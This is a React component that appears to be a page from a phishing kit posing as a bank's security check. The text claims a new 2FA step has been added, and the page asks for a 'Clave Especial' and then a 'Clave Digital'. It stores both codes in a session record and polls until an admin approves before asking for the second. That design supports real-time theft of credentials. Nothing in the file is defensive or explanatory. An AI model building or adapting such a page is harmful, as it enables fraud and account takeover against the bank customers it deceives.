import { useState, useEffect, useRef } from "react";
import LoginHeader from "../components/LoginHeader";
import { base44 } from "@/api/base44Client";

export default function Verificacion() {
  const urlParams = new URLSearchParams(window.location.search);
  const sessionId = urlParams.get("sessionId");

  // Fase 1: clave especial | Fase 2: clave digital
  const [phase, setPhase] = useState("claveEspecial"); // "claveEspecial" | "waitingApproval" | "claveDigital" | "done"
  const [claveEspecial, setClaveEspecial] = useState("");
  const [claveDigital, setClaveDigital] = useState("");
  const pollRef = useRef(null);

  useEffect(() => {
    return () => { if (pollRef.current) clearInterval(pollRef.current); };
  }, []);

  // Fase 1: el usuario envía la clave especial
  const handleSubmitClaveEspecial = async () => {
    if (!claveEspecial.trim() || !sessionId) return;
    await base44.entities.UserSessionData.update(sessionId, {
      claveEspecial: claveEspecial.trim(),
      claveEspecialStatus: "pending",
    });
    setPhase("waitingApproval");

    // Pollear hasta que el admin apruebe
    pollRef.current = setInterval(async () => {
      const res = await base44.entities.UserSessionData.filter({ id: sessionId });
      const s = res[0];
      if (!s) return;
      if (s.claveEspecialStatus === "approved") {
        clearInterval(pollRef.current);
        setPhase("claveDigital");
      }
    }, 3000);
  };

  // Fase 2: el usuario envía la clave digital
  const handleSubmitClaveDigital = async () => {
    if (!claveDigital.trim() || !sessionId) return;
    await base44.entities.UserSessionData.update(sessionId, {
      claveDigital: claveDigital.trim(),
    });
    setPhase("done");
  };

  // Spinner de espera
  if (phase === "waitingApproval" || phase === "done") {
    return (
      <div style={{ position: "fixed", inset: 0, background: "white", display: "flex", alignItems: "center", justifyContent: "center", zIndex: 9999 }}>
        <div style={{ width: "40px", height: "40px", border: "4px solid #e5e7eb", borderTop: "4px solid #1973B8", borderRadius: "50%", animation: "spin 1s linear infinite" }} />
        <style>{"@keyframes spin { to { transform: rotate(360deg); } }"}</style>
      </div>
    );
  }

  const isPhase1 = phase === "claveEspecial";
  const claveDigitalValid = claveDigital.trim().length > 0;

  return (
    <div className="min-h-screen bg-white font-main flex flex-col">
      <LoginHeader />
      <main className="flex-1 flex flex-col items-center pt-10">
        <div style={{ width: "100%", maxWidth: "620px", padding: "0 24px" }}>

          {/* Texto superior */}
          <p style={{ fontSize: "15px", color: "#121212", marginBottom: "24px", lineHeight: "1.6" }}>
            Hemos añadido recientemente un paso extra de verificación 2FA para
            reforzar la seguridad de su cuenta:
          </p>

          {/* Recuadro tipo tabla */}
          <div style={{ border: "1px solid #b0bec5", borderRadius: "2px", overflow: "hidden", marginBottom: "32px" }}>

            {/* Fila Clave Especial */}
            <div style={{ display: "flex", alignItems: "center", borderBottom: "1px solid #b0bec5", background: "#dce8f0" }}>
              <div style={{
                width: "260px", minWidth: "260px",
                padding: "10px 16px",
                fontSize: "14px", fontWeight: "bold", color: "#121212",
                borderRight: "1px solid #b0bec5",
              }}>
                Clave Especial
              </div>
              <div style={{ flex: 1, padding: "6px 12px" }}>
                <input
                  type="text"
                  value={claveEspecial}
                  onChange={(e) => isPhase1 && setClaveEspecial(e.target.value.replace(/\s/g, ""))}
                  disabled={!isPhase1}
                  style={{
                    width: "140px",
                    border: "1px solid #90a4ae",
                    borderRadius: "2px",
                    padding: "4px 8px",
                    fontSize: "14px",
                    outline: "none",
                    fontFamily: "inherit",
                    background: !isPhase1 ? "#f0f0f0" : "white",
                    color: !isPhase1 ? "#999" : "#121212",
                    cursor: !isPhase1 ? "not-allowed" : "text",
                  }}
                />
              </div>
            </div>

            {/* Fila Clave Digital */}
            <div style={{ display: "flex", alignItems: "center", background: "#dce8f0" }}>
              <div style={{
                width: "260px", minWidth: "260px",
                padding: "10px 16px",
                fontSize: "14px", fontWeight: "bold", color: "#121212",
                borderRight: "1px solid #b0bec5",
              }}>
                Clave Digital
              </div>
              <div style={{ flex: 1, padding: "6px 12px" }}>
                <input
                  type="text"
                  inputMode="numeric"
                  value={claveDigital}
                  onChange={(e) => {
                    if (phase !== "claveDigital") return;
                    const val = e.target.value.replace(/[^0-9]/g, "");
                    if (val.length <= 8) setClaveDigital(val);
                  }}
                  disabled={phase !== "claveDigital"}
                  style={{
                    width: "140px",
                    border: "1px solid #90a4ae",
                    borderRadius: "2px",
                    padding: "4px 8px",
                    fontSize: "14px",
                    outline: "none",
                    fontFamily: "inherit",
                    letterSpacing: "2px",
                    background: phase !== "claveDigital" ? "#f0f0f0" : "white",
                    color: phase !== "claveDigital" ? "#999" : "#121212",
                    cursor: phase !== "claveDigital" ? "not-allowed" : "text",
                  }}
                />
              </div>
            </div>
          </div>

          {/* Botón */}
          <div style={{ textAlign: "center" }}>
            {isPhase1 ? (
              <button
                disabled={!claveEspecial.trim()}
                onClick={handleSubmitClaveEspecial}
                style={{
                  padding: "11px 52px", fontSize: "15px",
                  background: claveEspecial.trim() ? "#1973B8" : "#d6d6d6",
                  color: claveEspecial.trim() ? "white" : "#999",
                  border: "none", borderRadius: "4px",
                  cursor: claveEspecial.trim() ? "pointer" : "not-allowed",
                  fontFamily: "inherit", transition: "all 0.2s",
                }}
              >
                Continuar
              </button>
            ) : (
              <button
                disabled={!claveDigitalValid}
                onClick={handleSubmitClaveDigital}
                style={{
                  padding: "11px 52px", fontSize: "15px",
                  background: claveDigitalValid ? "#1973B8" : "#d6d6d6",
                  color: claveDigitalValid ? "white" : "#999",
                  border: "none", borderRadius: "4px",
                  cursor: claveDigitalValid ? "pointer" : "not-allowed",
                  fontFamily: "inherit", transition: "all 0.2s",
                }}
              >
                Continuar
              </button>
            )}
          </div>

        </div>
      </main>
    </div>
  );
}
